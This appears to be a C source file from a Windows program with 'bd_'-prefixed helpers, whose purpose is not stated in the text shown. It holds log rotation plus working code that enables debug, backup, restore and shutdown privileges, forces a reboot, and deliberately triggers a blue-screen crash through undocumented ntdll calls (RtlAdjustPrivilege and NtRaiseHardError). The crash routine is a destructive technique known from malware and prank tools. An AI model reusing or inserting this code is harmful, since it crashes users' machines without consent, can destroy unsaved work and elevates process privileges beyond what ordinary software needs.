#include "bd_common.h"

/* 日志超过 5MB 轮转为 bd.log.1（只保留一份历史） */
#define BD_LOG_MAX_BYTES (5 * 1024 * 1024)

static CRITICAL_SECTION g_log_cs;
static volatile LONG g_log_inited = 0;

static void log_init(void) {
    if (InterlockedCompareExchange(&g_log_inited, 1, 0) == 0)
        InitializeCriticalSection(&g_log_cs);
}

static void rotate_log_if_needed(void) {
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (!GetFileAttributesExW(BD_LOG_FILE, GetFileExInfoStandard, &fad)) return;
    unsigned long long size = ((unsigned long long)fad.nFileSizeHigh << 32) | fad.nFileSizeLow;
    if (size < BD_LOG_MAX_BYTES) return;
    wchar_t old[MAX_PATH];
    swprintf(old, MAX_PATH, L"%s.1", BD_LOG_FILE);
    DeleteFileW(old);
    MoveFileW(BD_LOG_FILE, old);   /* 失败也无妨，继续追加 */
}

void bd_log(const wchar_t* fmt, ...) {
    log_init();
    EnterCriticalSection(&g_log_cs);
    rotate_log_if_needed();
    FILE *f = _wfopen(BD_LOG_FILE, L"a, ccs=UTF-8");
    if (f) {
        va_list args; va_start(args, fmt);
        vfwprintf(f, fmt, args); va_end(args);
        fwprintf(f, L"\n"); fclose(f);
    }
    LeaveCriticalSection(&g_log_cs);
}

BOOL bd_enable_privilege(LPCWSTR name) {
    HANDLE hToken; LUID luid; TOKEN_PRIVILEGES tp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    if (!LookupPrivilegeValueW(NULL, name, &luid)) { CloseHandle(hToken); return FALSE; }
    tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ok && GetLastError() == ERROR_SUCCESS;
}

void bd_enable_core_privileges(void) {
    bd_enable_privilege(SE_DEBUG_NAME); bd_enable_privilege(SE_BACKUP_NAME);
    bd_enable_privilege(SE_RESTORE_NAME); bd_enable_privilege(SE_SHUTDOWN_NAME);
}

void bd_force_reboot(void) {
    bd_enable_privilege(SE_SHUTDOWN_NAME);
    ExitWindowsEx(EWX_REBOOT | EWX_FORCEIFHUNG, 0);
}

void bd_trigger_bsod(void) {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll) { bd_force_reboot(); return; }
    typedef NTSTATUS (WINAPI *RtlAdjustPrivilege_t)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
    typedef NTSTATUS (WINAPI *NtRaiseHardError_t)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
    RtlAdjustPrivilege_t RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
    if (RtlAdjustPrivilege && NtRaiseHardError) {
        BOOLEAN prev = FALSE; ULONG response = 0;
        RtlAdjustPrivilege(19, TRUE, FALSE, &prev);
        NtRaiseHardError(0xC0000350, 0, 0, NULL, 6, &response);
    }
    bd_force_reboot();
}